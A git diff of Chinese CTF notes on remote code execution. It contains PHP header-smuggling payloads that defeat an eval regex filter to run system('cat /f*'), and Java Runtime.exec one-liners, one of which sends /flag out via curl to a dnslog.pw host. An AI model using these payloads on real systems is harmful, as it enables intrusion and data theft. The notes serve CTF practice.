@@ -1,6 +1,10 @@
+[CTF 中的 RCE](https://mp.weixin.qq.com/s/ur09Tx6saXd_FiMuhVltBQ)
 
-## 无参数rce
-* [Ezrce](https://mp.weixin.qq.com/s/lTcijxa9eoWMm0TRKwJh_A)
+# PHP
+
+## 无参数 rce
+
+- [Ezrce](https://mp.weixin.qq.com/s/lTcijxa9eoWMm0TRKwJh_A)
 
 ```php
 show_source(session_id(session_start()));
@@ -58,21 +62,22 @@ function func($func){
 
 ```php
 <?php
-if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
+if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {
     eval($_GET['code']);
 } else {
     show_source(__FILE__);
-    
+
 }
 // ?code=var_dump(get_defined_vars());&aaa=phpinfo()
 ```
 
 - \w 匹配大小写字母、数字和下划线，
 - \W 匹配非大小写字母、数字和下划线。
-- `[^\W]` 为\W取反=\w。\(和\)匹配()
-- (?R)递归匹配, aaa(bbb())，或aaa()。
+- `[^\W]` 为\W 取反=\w。\(和\)匹配()
+- (?R)递归匹配, aaa(bbb())，或 aaa()。
 
 进阶版
+
 ```php
 <?php
 highlight_file(__FILE__);
@@ -82,7 +87,9 @@ if (';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['star'])) {
     }
 }
 ```
-bp发包
+
+bp 发包
+
 ```sh
 GET /bo0g1pop.php?star=eval(pos(array_reverse(getallheaders()))); HTTP/1.1
 Host: faf83665-1a88-473a-b765-ddd33c6cf370.node4.buuoj.cn:81
@@ -94,7 +101,9 @@ Connection: close
 X-Forwarder-Proto: system('cat /f*');
 Upgrade-Insecure-Requests: 1
 ```
-解2
+
+解 2
+
 ```sh
 Paylaod:bo0g1pop.php?star=print_r(getallheaders()); 然后随便添加个参数：newstar=phpinfo();
 ?star=eval(array_rand(array_flip(getallheaders())));
@@ -102,4 +111,13 @@ Paylaod:bo0g1pop.php?star=print_r(getallheaders()); 然后随便添加个参数�
 array_reverse
 array_flip()函数，它会将传进来的数组进行一个键和值的互换，这样的话phpinfo();就变成键了，
 array_rand(),
+```
+
+# Java
+
+```java
+new java.util.Scanner(java.lang.Runtime.getRuntime().exec('cat /flag').getInputStream())
+select new java.io.BufferedReader(new java.o.FileReader("/flag") ).readLine()
+// you need java bash encode the {command}
+java.lang.Runtime.getRuntime().exec('{curl `read /flag`.1ue.dnslog.pw}')
 ```
